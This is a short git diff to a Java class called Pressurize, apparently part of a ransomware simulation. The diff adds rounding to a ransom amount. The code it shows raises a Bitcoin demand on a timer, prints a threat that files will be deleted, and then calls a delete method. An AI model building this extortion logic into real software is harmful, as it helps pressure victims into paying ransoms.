@@ -7,6 +7,8 @@ import console.TextColor;
 import leverCom.RansomwareReflector;
 import person.IConsoleUser;
 
+import java.math.BigDecimal;
+import java.math.RoundingMode;
 import java.util.Objects;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -39,7 +41,7 @@ public class Pressurize implements IConsoleUser {
                 @Override
                 public void run() {
                     timerCount++;
-                    Double toPay = 0.02755 + timerCount * 0.01;
+                    Double toPay = new BigDecimal(0.02755 + timerCount * 0.01).setScale(5, RoundingMode.HALF_UP).doubleValue();
 
 
                     if (timerCount < 4) {
@@ -47,7 +49,7 @@ public class Pressurize implements IConsoleUser {
                         writeToConsole(ConsoleCorrespondation.M_RANSOMINCREASED, TextColor.RED);
 
                     } else if(timerCount == 4) {
-                        ConsoleCorrespondation.M_RANSOMFINAL.setValue(">>Pay " + toPay + " BTC immediately or your files will be irrevocably deleted!");
+                        ConsoleCorrespondation.M_RANSOMFINAL.setValue(">>Pay " +toPay + " BTC immediately or your files will be irrevocably deleted!");
                         writeToConsole(ConsoleCorrespondation.M_RANSOMFINAL, TextColor.RED);
                     }else if(timerCount == 5){
                         reflector.delete();
